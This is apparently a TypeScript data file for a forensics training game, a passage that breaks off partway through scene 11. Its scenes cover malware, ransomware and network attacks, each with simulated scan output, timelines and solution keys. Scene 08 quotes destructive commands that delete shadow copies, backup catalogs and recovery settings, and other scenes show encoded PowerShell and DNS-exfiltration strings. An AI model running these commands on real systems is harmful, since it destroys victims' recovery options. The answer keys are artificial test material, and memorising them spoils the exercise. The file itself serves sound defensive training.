export type FindingKey = "ext" | "kw" | "ts" | "hash";
export type Risk = "HIGH" | "MED" | "LOW" | "CLEAN";
export type Difficulty = "BEGINNER" | "INTERMEDIATE" | "ADVANCED";

export interface SceneFile {
  name: string;
  risk: Risk;
  declared_type: string;
  actual_type: string;
  risk_score: number;
  hash: string;
  findings: FindingKey[];
  terminal_lines: string[];
  tags: string[];
}

export interface TimelineNode {
  time: string;
  event: string;
  severity: Risk;
  detail: string;
}

export interface NetworkConnection {
  dst_ip: string;
  dst_port: number;
  protocol: string;
  country: string;
  bytes: number;
  suspicious: boolean;
  label: string;
}

export interface NetworkLog {
  connections: NetworkConnection[];
  dns_queries: { query: string; type: string; suspicious: boolean }[];
  stats: { total: number; suspicious: number; exfiltrated_mb: number };
}

export interface Scene {
  id: string;
  title: string;
  category: string;
  difficulty: Difficulty;
  scenario: string;
  files: SceneFile[];
  timeline: TimelineNode[];
  network_log: NetworkLog;
  solution: {
    findings: FindingKey[];
    explanations: Record<string, string>;
  };
}

export const SCENES: Scene[] = [
  {
    id: "01",
    title: "The Disguised Script",
    category: "malware",
    difficulty: "BEGINNER",
    scenario: "A company's HR department received an email from an unknown sender with an attachment named 'vacation_photo.jpg'. Shortly after an employee opened it, the IT team noticed unusual outbound traffic. Investigate the file and determine what happened.",
    files: [
      {
        name: "vacation_photo.jpg",
        risk: "HIGH",
        declared_type: "JPEG Image",
        actual_type: "Python Script",
        risk_score: 92,
        hash: "a3f9c2b1e4d7f6a8b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5",
        findings: ["ext", "kw", "ts"],
        terminal_lines: [
          "[*] Scanning: vacation_photo.jpg",
          "[!] MAGIC BYTES MISMATCH: File header is 0x23 0x21 (shebang), not 0xFF 0xD8 (JPEG)",
          "[!] ACTUAL TYPE: Python script detected",
          "[!] KEYWORD MATCH: 'subprocess.call' found at offset 0x1A4",
          "[!] KEYWORD MATCH: 'socket.connect' found at offset 0x2B8",
          "[!] KEYWORD MATCH: 'base64.b64decode' found at offset 0x3C1",
          "[!] TIMESTAMP ANOMALY: Created 2024-01-15 02:34:17 (2:34 AM - unusual hours)",
          "[+] SHA-256: a3f9c2b1e4d7f6a8b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5",
          "[!] HASH MATCH: Known malware signature in threat database",
          "[*] Scan complete — THREAT DETECTED",
        ],
        tags: ["EXT MISMATCH", "PYTHON", "C2", "SUSPICIOUS HOURS", "KNOWN MALWARE"],
      },
      {
        name: "company_logo.png",
        risk: "LOW",
        declared_type: "PNG Image",
        actual_type: "PNG Image",
        risk_score: 5,
        hash: "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
        findings: [],
        terminal_lines: [
          "[*] Scanning: company_logo.png",
          "[+] MAGIC BYTES: 0x89 0x50 0x4E 0x47 — Valid PNG header",
          "[+] Content analysis: Standard image data, no embedded scripts",
          "[+] Timestamp: 2024-01-10 09:15:00 — Normal business hours",
          "[+] SHA-256: b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
          "[+] Hash check: Clean — not in threat database",
          "[*] Scan complete — CLEAN",
        ],
        tags: ["CLEAN"],
      },
      {
        name: "readme.txt",
        risk: "LOW",
        declared_type: "Text File",
        actual_type: "Text File",
        risk_score: 3,
        hash: "c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3",
        findings: [],
        terminal_lines: [
          "[*] Scanning: readme.txt",
          "[+] MAGIC BYTES: Plain text — no binary header",
          "[+] Content analysis: Standard text content, no suspicious keywords",
          "[+] Timestamp: 2024-01-12 14:22:00 — Normal",
          "[+] SHA-256: c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3",
          "[*] Scan complete — CLEAN",
        ],
        tags: ["CLEAN"],
      },
    ],
    timeline: [
      { time: "02:34:17", event: "File created", severity: "HIGH", detail: "vacation_photo.jpg created at unusual hour (2:34 AM)" },
      { time: "09:12:04", event: "Email received", severity: "MED", detail: "Phishing email with attachment delivered to HR inbox" },
      { time: "09:14:33", event: "File opened", severity: "HIGH", detail: "Employee executed the Python script disguised as JPEG" },
      { time: "09:14:35", event: "Outbound connection", severity: "HIGH", detail: "Script connected to 185.220.101.45:4444 (C2 server)" },
      { time: "09:14:38", event: "Data exfiltration", severity: "HIGH", detail: "2.4 MB of data sent to attacker's server" },
    ],
    network_log: {
      connections: [
        { dst_ip: "185.220.101.45", dst_port: 4444, protocol: "TCP", country: "Russia", bytes: 2457600, suspicious: true, label: "C2 Beacon" },
        { dst_ip: "8.8.8.8", dst_port: 53, protocol: "UDP", country: "USA", bytes: 512, suspicious: false, label: "DNS Query" },
      ],
      dns_queries: [
        { query: "evil-c2.ru", type: "A", suspicious: true },
        { query: "google.com", type: "A", suspicious: false },
      ],
      stats: { total: 4, suspicious: 2, exfiltrated_mb: 2.4 },
    },
    solution: {
      findings: ["ext", "kw", "ts"],
      explanations: {
        ext: "The file has a .jpg extension but magic bytes 0x23 0x21 reveal it's a Python script (shebang). This classic disguise tricks users into thinking it's an image.",
        kw: "The script contains dangerous keywords: subprocess.call (executes system commands), socket.connect (network connection), and base64.b64decode (obfuscation).",
        ts: "The file was created at 2:34 AM — a timestamp anomaly suggesting automated creation during off-hours, typical of attacker activity.",
        hash: "The file's SHA-256 hash matches a known Python RAT (Remote Access Trojan) in the threat intelligence database.",
      },
    },
  },
  {
    id: "02",
    title: "The Office Macro",
    category: "malware",
    difficulty: "BEGINNER",
    scenario: "A finance employee received a 'budget_Q4_2024.docx' file from an unknown sender. Shortly after opening it and enabling macros, the corporate firewall logged suspicious outbound traffic. Investigate the document.",
    files: [
      {
        name: "budget_Q4_2024.docx",
        risk: "HIGH",
        declared_type: "Word Document",
        actual_type: "Word Document with Macro",
        risk_score: 88,
        hash: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: budget_Q4_2024.docx",
          "[+] MAGIC BYTES: PK header — valid ZIP/OOXML format",
          "[!] VBA MACRO DETECTED: AutoOpen() macro found",
          "[!] KEYWORD MATCH: 'Shell' command in VBA at line 14",
          "[!] KEYWORD MATCH: 'WScript.Shell' — system shell access",
          "[!] KEYWORD MATCH: 'CreateObject(\"MSXML2.XMLHTTP\")' — HTTP request from macro",
          "[!] TIMESTAMP ANOMALY: Modified 2024-03-07 23:58:12 (11:58 PM)",
          "[+] SHA-256: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5",
          "[*] Scan complete — THREAT DETECTED",
        ],
        tags: ["VBA MACRO", "AUTOOPEN", "C2 DOWNLOAD", "SUSPICIOUS HOURS"],
      },
    ],
    timeline: [
      { time: "23:58:12", event: "Document modified", severity: "HIGH", detail: "Macro injected into document at nearly midnight" },
      { time: "10:22:00", event: "Email received", severity: "MED", detail: "Phishing document delivered to finance team" },
      { time: "10:24:15", event: "Macros enabled", severity: "HIGH", detail: "User clicked 'Enable Content' — AutoOpen() triggered" },
      { time: "10:24:17", event: "C2 connection", severity: "HIGH", detail: "Macro downloaded second-stage payload from attacker server" },
    ],
    network_log: {
      connections: [
        { dst_ip: "91.108.56.12", dst_port: 80, protocol: "TCP", country: "Netherlands", bytes: 892000, suspicious: true, label: "Payload Download" },
      ],
      dns_queries: [
        { query: "update-service.net", type: "A", suspicious: true },
      ],
      stats: { total: 2, suspicious: 1, exfiltrated_mb: 0.9 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "The document contains an AutoOpen() VBA macro that runs Shell commands and creates an HTTP request object to download a second-stage payload from a C2 server.",
        ts: "The document was last modified at 23:58 — nearly midnight — suggesting it was prepared by an attacker during off-hours before being distributed.",
      },
    },
  },
  {
    id: "03",
    title: "The Fake PDF",
    category: "malware",
    difficulty: "INTERMEDIATE",
    scenario: "A law firm received 'contract_signed.pdf' via email. The IT team noticed PowerShell activity shortly after the file was opened. Timestamps on the file don't match when the supposed contract was signed.",
    files: [
      {
        name: "contract_signed.pdf",
        risk: "HIGH",
        declared_type: "PDF Document",
        actual_type: "PDF with Embedded PowerShell",
        risk_score: 95,
        hash: "e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
        findings: ["ext", "kw", "ts"],
        terminal_lines: [
          "[*] Scanning: contract_signed.pdf",
          "[+] MAGIC BYTES: 0x25 0x50 0x44 0x46 — Valid PDF header",
          "[!] EMBEDDED OBJECT DETECTED: JavaScript action in PDF",
          "[!] KEYWORD MATCH: 'powershell -enc' in embedded JS",
          "[!] KEYWORD MATCH: Base64 payload — 4096 bytes encoded command",
          "[!] TIMESTAMP FALSIFICATION: Created 2024-01-01 (metadata) but filesystem shows 2024-03-22 03:11:00",
          "[!] METADATA MISMATCH: Author field tampered",
          "[+] SHA-256: e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
          "[*] Scan complete — THREAT DETECTED",
        ],
        tags: ["PDF JS", "POWERSHELL", "BASE64", "TIMESTAMP FALSIFIED"],
      },
    ],
    timeline: [
      { time: "03:11:00", event: "File created", severity: "HIGH", detail: "Malicious PDF crafted at 3 AM" },
      { time: "09:44:00", event: "Email received", severity: "MED", detail: "Spear-phishing email to lawyer" },
      { time: "09:46:22", event: "PDF opened", severity: "HIGH", detail: "Acrobat executed embedded JavaScript" },
      { time: "09:46:24", event: "PowerShell spawned", severity: "HIGH", detail: "cmd.exe spawned powershell -enc [base64]" },
    ],
    network_log: {
      connections: [
        { dst_ip: "45.142.212.100", dst_port: 443, protocol: "TCP", country: "Ukraine", bytes: 1245000, suspicious: true, label: "HTTPS C2" },
      ],
      dns_queries: [
        { query: "secure-updates.xyz", type: "A", suspicious: true },
      ],
      stats: { total: 3, suspicious: 2, exfiltrated_mb: 1.2 },
    },
    solution: {
      findings: ["ext", "kw", "ts"],
      explanations: {
        ext: "Although magic bytes confirm a real PDF, the file contains an embedded JavaScript action — the 'actual type' is a weaponized PDF, not a clean document.",
        kw: "Embedded JavaScript launches 'powershell -enc' with a Base64-encoded command — classic fileless malware execution technique.",
        ts: "Internal PDF metadata claims creation date January 2024, but filesystem timestamps show March 2024 at 3 AM — deliberate falsification to appear as a legitimate old contract.",
      },
    },
  },
  {
    id: "04",
    title: "The DLL Hijack",
    category: "malware",
    difficulty: "INTERMEDIATE",
    scenario: "Users report that a popular design application is behaving strangely after an update. Analysis shows that a DLL in the application folder was replaced. Investigate the suspicious DLL.",
    files: [
      {
        name: "version.dll",
        risk: "HIGH",
        declared_type: "Windows DLL",
        actual_type: "Malicious DLL",
        risk_score: 85,
        hash: "f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7",
        findings: ["hash", "ts", "kw"],
        terminal_lines: [
          "[*] Scanning: version.dll",
          "[+] MAGIC BYTES: 0x4D 0x5A — Valid PE/DLL header",
          "[!] HASH MATCH: This DLL does not match Microsoft's signed version.dll",
          "[!] IMPORT TABLE: Contains 'WSAConnect', 'CreateRemoteThread' — not normal for version.dll",
          "[!] KEYWORD MATCH: Embedded string 'cmd.exe /c whoami' found",
          "[!] TIMESTAMP: 2024-04-01 01:23:45 — modified at 1 AM, suspicious",
          "[!] SIGNATURE: Unsigned binary in system application folder",
          "[+] SHA-256: f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7",
          "[*] Scan complete — THREAT DETECTED",
        ],
        tags: ["DLL HIJACK", "UNSIGNED", "REMOTE THREAD", "SUSPICIOUS HOURS"],
      },
    ],
    timeline: [
      { time: "01:23:45", event: "DLL replaced", severity: "HIGH", detail: "Attacker replaced legitimate version.dll at 1 AM" },
      { time: "08:30:00", event: "App launched", severity: "HIGH", detail: "Application loaded malicious DLL automatically" },
      { time: "08:30:01", event: "Shellcode injected", severity: "HIGH", detail: "CreateRemoteThread injected shellcode into explorer.exe" },
    ],
    network_log: {
      connections: [
        { dst_ip: "104.21.45.67", dst_port: 8080, protocol: "TCP", country: "USA", bytes: 654000, suspicious: true, label: "C2 Beacon" },
      ],
      dns_queries: [
        { query: "analytics-cdn.net", type: "A", suspicious: true },
      ],
      stats: { total: 2, suspicious: 1, exfiltrated_mb: 0.6 },
    },
    solution: {
      findings: ["hash", "ts", "kw"],
      explanations: {
        hash: "The SHA-256 hash of version.dll does not match Microsoft's legitimate signed version — the file was replaced with a malicious copy.",
        ts: "The DLL was modified at 1:23 AM, while the legitimate application hasn't been updated in months — the timestamp reveals unauthorized modification.",
        kw: "Embedded strings include 'cmd.exe /c whoami', 'WSAConnect', and 'CreateRemoteThread' — none of which belong in the legitimate version.dll.",
      },
    },
  },
  {
    id: "05",
    title: "The Memory Dump",
    category: "malware",
    difficulty: "ADVANCED",
    scenario: "A workstation was acting erratically. IT captured a memory dump before rebooting. Analysis of explorer.exe's memory space reveals injected shellcode. No files on disk show the threat.",
    files: [
      {
        name: "explorer.exe.dmp",
        risk: "HIGH",
        declared_type: "Memory Dump",
        actual_type: "Memory Dump with Injected Shellcode",
        risk_score: 97,
        hash: "a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8",
        findings: ["kw", "hash"],
        terminal_lines: [
          "[*] Scanning: explorer.exe.dmp",
          "[*] Parsing PE regions in memory dump...",
          "[!] INJECTED REGION DETECTED: RWX memory at 0x1A4F0000 — not mapped to any legitimate DLL",
          "[!] SHELLCODE SIGNATURE: MZ header at offset 0x1A4F0000 inside non-PE region",
          "[!] KEYWORD MATCH: 'VirtualAllocEx', 'WriteProcessMemory' strings in injected region",
          "[!] KEYWORD MATCH: Meterpreter stage 2 shellcode pattern detected",
          "[!] C2 IP HARDCODED: 192.168.1.200:4444 in shellcode (lateral movement to internal host)",
          "[+] SHA-256 (dump): a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8",
          "[!] HASH MATCH: Injected shellcode matches Metasploit Meterpreter signature",
          "[*] Scan complete — CRITICAL THREAT — FILELESS MALWARE",
        ],
        tags: ["SHELLCODE", "PROCESS INJECTION", "METERPRETER", "FILELESS", "RWX REGION"],
      },
    ],
    timeline: [
      { time: "00:00:00", event: "Initial compromise", severity: "HIGH", detail: "Unknown initial vector — no file artifacts found on disk" },
      { time: "T+00:02", event: "Process injection", severity: "HIGH", detail: "Shellcode injected into explorer.exe via WriteProcessMemory" },
      { time: "T+00:03", event: "Beacon established", severity: "HIGH", detail: "Meterpreter stage 2 connected to internal 192.168.1.200:4444" },
    ],
    network_log: {
      connections: [
        { dst_ip: "192.168.1.200", dst_port: 4444, protocol: "TCP", country: "Internal", bytes: 345000, suspicious: true, label: "Meterpreter C2" },
      ],
      dns_queries: [],
      stats: { total: 1, suspicious: 1, exfiltrated_mb: 0.3 },
    },
    solution: {
      findings: ["kw", "hash"],
      explanations: {
        kw: "Memory analysis reveals injected shellcode using VirtualAllocEx/WriteProcessMemory — classic process hollowing. Meterpreter stage 2 pattern with hardcoded C2 IP found in the RWX region.",
        hash: "The shellcode's signature matches Metasploit's Meterpreter payload in the threat database — a widely used post-exploitation framework.",
      },
    },
  },
  {
    id: "06",
    title: "The Rootkit Trail",
    category: "malware",
    difficulty: "ADVANCED",
    scenario: "A Linux server shows signs of compromise despite all logs appearing clean. A forensic image reveals hidden processes and modified system binaries. Something is hiding at the kernel level.",
    files: [
      {
        name: "/bin/ls",
        risk: "HIGH",
        declared_type: "ELF Binary",
        actual_type: "Trojanized ELF Binary",
        risk_score: 98,
        hash: "b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9",
        findings: ["hash", "ts", "kw"],
        terminal_lines: [
          "[*] Scanning: /bin/ls (forensic image)",
          "[+] MAGIC BYTES: 0x7F 0x45 0x4C 0x46 — Valid ELF header",
          "[!] HASH MISMATCH: Expected sha256 for Debian ls binary, got different hash",
          "[!] TROJANIZED: Binary size 89KB vs expected 72KB — extra 17KB injected",
          "[!] KEYWORD MATCH: Hidden string 'hide_pid' — rootkit function",
          "[!] KEYWORD MATCH: 'getdents64' hook — intercepting file listing syscall",
          "[!] TIMESTAMP: Modified 2024-05-10 04:22:01 — 4 AM modification of system binary",
          "[+] SHA-256: b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9",
          "[*] Scan complete — ROOTKIT DETECTED",
        ],
        tags: ["ROOTKIT", "TROJANIZED BINARY", "SYSCALL HOOK", "PERSISTENCE"],
      },
    ],
    timeline: [
      { time: "04:22:01", event: "Binary replaced", severity: "HIGH", detail: "Attacker replaced /bin/ls with rootkit version at 4 AM" },
      { time: "04:22:15", event: "Registry hidden", severity: "HIGH", detail: "Rootkit kernel module loaded — hiding attacker's processes" },
    ],
    network_log: {
      connections: [
        { dst_ip: "77.88.55.60", dst_port: 53, protocol: "UDP", country: "Russia", bytes: 12000, suspicious: true, label: "DNS Exfil" },
      ],
      dns_queries: [
        { query: "xn--e1afmkfd.xn--p1ai", type: "TXT", suspicious: true },
      ],
      stats: { total: 3, suspicious: 2, exfiltrated_mb: 0.01 },
    },
    solution: {
      findings: ["hash", "ts", "kw"],
      explanations: {
        hash: "The /bin/ls binary hash doesn't match the expected Debian package hash — the binary was replaced with a trojanized version 17KB larger.",
        ts: "System binary was modified at 4:22 AM — system binaries should never change except during official updates, and never at 4 AM.",
        kw: "The binary contains 'hide_pid' and hooks 'getdents64' — functions used by Linux rootkits to hide processes and files from administrators.",
      },
    },
  },
  {
    id: "07",
    title: "First Encryption",
    category: "ransomware",
    difficulty: "BEGINNER",
    scenario: "A small accounting firm's shared drive suddenly showed thousands of files renamed with a .locked extension. A ransom note appeared on the desktop. Investigate the initial infection vector.",
    files: [
      {
        name: "HOW_TO_DECRYPT.txt",
        risk: "HIGH",
        declared_type: "Text File",
        actual_type: "Ransom Note",
        risk_score: 99,
        hash: "c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: HOW_TO_DECRYPT.txt",
          "[!] KEYWORD MATCH: 'Bitcoin' — ransom payment demand",
          "[!] KEYWORD MATCH: 'Your files have been encrypted'",
          "[!] KEYWORD MATCH: 'BTC wallet: 1A2B3C...' — cryptocurrency address",
          "[!] KEYWORD MATCH: '72 hours' — time pressure tactic",
          "[!] TIMESTAMP: Created 2024-06-03 14:33:01 — matches file encryption time",
          "[*] Scan complete — RANSOMWARE NOTE DETECTED",
        ],
        tags: ["RANSOM NOTE", "BITCOIN", "ENCRYPTION"],
      },
      {
        name: "financials_2024.xlsx.locked",
        risk: "HIGH",
        declared_type: "Encrypted File",
        actual_type: "Encrypted Excel (Ransomware)",
        risk_score: 95,
        hash: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        findings: ["ext", "kw"],
        terminal_lines: [
          "[*] Scanning: financials_2024.xlsx.locked",
          "[!] EXTENSION ANOMALY: Double extension .xlsx.locked",
          "[!] MAGIC BYTES: Random bytes — no recognized file format header",
          "[!] ENTROPY: 7.98/8.0 — extremely high, consistent with encryption",
          "[!] KEYWORD: Ransomware marker header 'LOCKED::LockBit' found at offset 0x00",
          "[*] Scan complete — ENCRYPTED FILE (RANSOMWARE)",
        ],
        tags: ["ENCRYPTED", "HIGH ENTROPY", "LOCKED EXTENSION", "LOCKBIT"],
      },
    ],
    timeline: [
      { time: "14:28:00", event: "Ransomware executed", severity: "HIGH", detail: "LockBit variant started encrypting files on shared drive" },
      { time: "14:33:01", event: "Encryption complete", severity: "HIGH", detail: "3,847 files encrypted, ransom note dropped on all desktops" },
    ],
    network_log: {
      connections: [
        { dst_ip: "185.100.87.202", dst_port: 443, protocol: "TCP", country: "Romania", bytes: 1024, suspicious: true, label: "Key Exchange" },
      ],
      dns_queries: [
        { query: "lockbit-pay.onion.pet", type: "A", suspicious: true },
      ],
      stats: { total: 2, suspicious: 2, exfiltrated_mb: 0 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "The ransom note contains classic ransomware keywords: Bitcoin payment demand, wallet address, and time-pressure tactics typical of LockBit operations.",
        ts: "All encrypted files share the exact same timestamp — 14:33:01 — indicating they were all renamed by the ransomware process in the same second.",
      },
    },
  },
  {
    id: "08",
    title: "Shadow Copy Wipe",
    category: "ransomware",
    difficulty: "INTERMEDIATE",
    scenario: "After a ransomware attack, incident responders found that all Windows shadow copies had been deleted. Investigate the Windows event logs and PowerShell history to reconstruct what commands were used.",
    files: [
      {
        name: "PowerShell_transcript.log",
        risk: "HIGH",
        declared_type: "Log File",
        actual_type: "PowerShell Transcript with VSS Deletion",
        risk_score: 91,
        hash: "e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: PowerShell_transcript.log",
          "[!] KEYWORD MATCH: 'vssadmin delete shadows /all /quiet'",
          "[!] KEYWORD MATCH: 'wmic shadowcopy delete'",
          "[!] KEYWORD MATCH: 'bcdedit /set {default} recoveryenabled No'",
          "[!] KEYWORD MATCH: 'wbadmin delete catalog -quiet'",
          "[!] TIMESTAMP: Commands executed 2024-07-14 03:45:12 — 3 AM",
          "[!] ANTI-FORENSIC: Backup catalogs and recovery disabled before encryption",
          "[*] Scan complete — RANSOMWARE PREP COMMANDS DETECTED",
        ],
        tags: ["VSS DELETE", "ANTI-RECOVERY", "BACKUP WIPE", "BCDEDIT"],
      },
    ],
    timeline: [
      { time: "03:45:12", event: "Shadow copies deleted", severity: "HIGH", detail: "vssadmin delete shadows /all /quiet — all restore points removed" },
      { time: "03:45:15", event: "Recovery disabled", severity: "HIGH", detail: "bcdedit modified to prevent Windows recovery boot" },
      { time: "03:46:00", event: "Encryption started", severity: "HIGH", detail: "Ransomware payload launched after cleanup" },
    ],
    network_log: {
      connections: [],
      dns_queries: [],
      stats: { total: 0, suspicious: 0, exfiltrated_mb: 0 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "The log contains the exact commands used to destroy recovery options: vssadmin deletes shadow copies, bcdedit disables recovery boot, and wbadmin deletes backup catalogs — all standard ransomware anti-recovery steps.",
        ts: "These destructive commands ran at 3:45 AM, before business hours, to minimize chance of detection and intervention before encryption completes.",
      },
    },
  },
  {
    id: "09",
    title: "Double Extortion",
    category: "ransomware",
    difficulty: "ADVANCED",
    scenario: "A healthcare provider was hit with ransomware. Beyond encrypted files, threat actors claim to have stolen 50,000 patient records. Investigate network logs to confirm exfiltration before encryption.",
    files: [
      {
        name: "netflow_capture.pcap",
        risk: "HIGH",
        declared_type: "Network Capture",
        actual_type: "Network Capture with Exfiltration Evidence",
        risk_score: 94,
        hash: "f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: netflow_capture.pcap",
          "[*] Parsing network capture...",
          "[!] LARGE OUTBOUND TRANSFER: 47.3 GB sent to 192.0.2.100 over 6 hours",
          "[!] KEYWORD MATCH: 'rclone.exe' process detected in metadata",
          "[!] KEYWORD MATCH: SFTP protocol to external host",
          "[!] TIMESTAMP: Transfer 2024-08-20 21:00:00 to 03:00:00 — overnight",
          "[!] DESTINATION: IP geolocates to bulletproof hosting in Moldova",
          "[!] PATTERN: Encrypted SFTP chunks — consistent with rclone exfil tool",
          "[*] Scan complete — DATA EXFILTRATION CONFIRMED",
        ],
        tags: ["EXFILTRATION", "RCLONE", "SFTP", "47GB", "DOUBLE EXTORTION"],
      },
    ],
    timeline: [
      { time: "21:00:00", event: "Exfiltration started", severity: "HIGH", detail: "rclone.exe began uploading patient database via SFTP" },
      { time: "03:00:00", event: "Exfiltration complete", severity: "HIGH", detail: "47.3 GB transferred to attacker-controlled server" },
      { time: "03:15:00", event: "Ransomware deployed", severity: "HIGH", detail: "Encryption began after data theft confirmed" },
    ],
    network_log: {
      connections: [
        { dst_ip: "192.0.2.100", dst_port: 22, protocol: "TCP", country: "Moldova", bytes: 50767381504, suspicious: true, label: "Data Exfil (47.3 GB)" },
      ],
      dns_queries: [
        { query: "backup-cloud.md", type: "A", suspicious: true },
      ],
      stats: { total: 5, suspicious: 3, exfiltrated_mb: 47300 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "Network capture shows rclone.exe used for SFTP transfer of 47.3 GB to a bulletproof hosting server — rclone is a legitimate tool frequently abused for large-scale data exfiltration.",
        ts: "The transfer ran from 9 PM to 3 AM — a deliberate overnight window to avoid detection during business hours. Ransomware only launched after exfiltration completed, confirming double extortion.",
      },
    },
  },
  {
    id: "10",
    title: "The C2 Beacon",
    category: "network",
    difficulty: "BEGINNER",
    scenario: "A company's firewall flagged unusually periodic outbound connections from a workstation. The connections happen every 60 seconds to the same foreign IP. Investigate the beacon pattern.",
    files: [
      {
        name: "firewall_log.txt",
        risk: "HIGH",
        declared_type: "Log File",
        actual_type: "Log File with C2 Beacon Pattern",
        risk_score: 80,
        hash: "a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: firewall_log.txt",
          "[*] Analyzing connection patterns...",
          "[!] BEACON DETECTED: Connections to 203.0.113.55:443 every 60±2 seconds",
          "[!] PATTERN: 127 connections over 2.1 hours — jittered interval (C2 evasion)",
          "[!] KEYWORD MATCH: User-Agent 'Mozilla/4.0 (compatible; MSIE 6.0)' — outdated, spoofed",
          "[!] DESTINATION: IP is not in any CDN or cloud ASN — dedicated server",
          "[!] TIMESTAMP: Beacon started 2024-09-12 23:15:00 (after business hours)",
          "[+] GEO: 203.0.113.55 → Minsk, Belarus",
          "[*] Scan complete — C2 BEACON IDENTIFIED",
        ],
        tags: ["C2 BEACON", "PERIODIC", "JITTER", "SUSPICIOUS UA"],
      },
    ],
    timeline: [
      { time: "23:15:00", event: "Beacon started", severity: "HIGH", detail: "First C2 connection to 203.0.113.55:443" },
      { time: "23:16:00", event: "Regular check-ins", severity: "MED", detail: "60-second jittered beacon — waiting for operator commands" },
    ],
    network_log: {
      connections: [
        { dst_ip: "203.0.113.55", dst_port: 443, protocol: "TCP", country: "Belarus", bytes: 48000, suspicious: true, label: "C2 Beacon (x127)" },
      ],
      dns_queries: [
        { query: "windows-telemetry-service.net", type: "A", suspicious: true },
      ],
      stats: { total: 127, suspicious: 127, exfiltrated_mb: 0.05 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "The firewall log shows connections with a spoofed legacy User-Agent and a jittered 60-second interval — both are classic indicators of C2 beacon behavior designed to blend in with normal traffic.",
        ts: "The beacon started at 11:15 PM and ran through the night — attackers often time initial C2 communication to off-hours when monitoring is reduced.",
      },
    },
  },
  {
    id: "11",
    title: "DNS Tunneling",
    category: "network",
    difficulty: "INTERMEDIATE",
    scenario: "Data is leaving the network but the firewall shows no suspicious HTTPS or FTP traffic. A DNS analysis reveals thousands of unusually long queries going to a single domain. Investigate the DNS logs.",
    files: [
      {
        name: "dns_queries.log",
        risk: "HIGH",
        declared_type: "Log File",
        actual_type: "Log File with DNS Tunneling",
        risk_score: 89,
        hash: "b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: dns_queries.log",
          "[*] Analyzing DNS query patterns...",
          "[!] DNS TUNNEL DETECTED: 4,847 queries to *.exfil.attacker-domain.com",
          "[!] KEYWORD: TXT record queries — unusual for normal browsing",
          "[!] QUERY LENGTH ANOMALY: Average query length 220 chars (normal < 30)",
          "[!] EXAMPLE: 'aGVsbG8gd29ybGQ=.exfil.attacker-domain.com' — Base64 in subdomain",
          "[!] DATA RATE: ~4.8 MB exfiltrated via DNS over 3 hours",
          "[!] TIMESTAMP: Queries 2024-10-01 01:00:00 to 04:00:00",
          "[*] Scan complete — DNS TUNNELING CONFIRMED",
        ],
        tags: ["DNS TUNNEL", "BASE64", "TXT RECORD", "EXFIL"],
      },
    ],
    timeline: [
      { time: "01:00:00", event: "Tunneling started", severity: "HIGH", detail: "DNS queries began carrying Base64-encoded data in subdomains" },
      { time: "04:00:00", event: "Transfer complete", severity: "HIGH", detail: "4.8 MB exfiltrated — only detectable via DNS anomaly analysis" },
    ],
    network_log: {
      connections: [],
      dns_queries: [
        { query: "aGVsbG8gd29ybGQ=.exfil.attacker-domain.com", type: "TXT", suspicious: true },
        { query: "dGhpcyBpcyBzZWNyZXQ=.exfil.attacker-domain.com", type: "TXT", suspicious: true },
      ],
      stats: { total: 4847, suspicious: 4847, exfiltrated_mb: 4.8 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
